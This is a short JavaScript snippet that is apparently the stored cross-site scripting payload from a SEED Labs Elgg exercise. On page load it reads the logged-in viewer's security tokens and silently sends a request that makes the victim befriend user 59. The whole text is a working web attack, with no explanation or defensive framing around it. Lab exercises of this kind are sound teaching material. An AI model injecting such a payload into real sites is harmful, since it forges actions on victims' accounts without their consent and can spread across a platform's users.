<script type="text/javascript">
window.onload = function() {

    let Ajax = null;
    let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
    let token = "&__elgg_token="+elgg.security.token.__elgg_token;
    let victimID = elgg.session.user.guid;
    const SKIP_ID = 59;
    if(victimID !== SKIP_ID){
        let sendUrl = `http://www.seed-server.com/action/friends/add?friend=${SKIP_ID}${ts}${token}`;

        Ajax = new XMLHttpRequest();
        Ajax.open("Get", sendUrl, true);
        Ajax.send();
    }
}
</script>
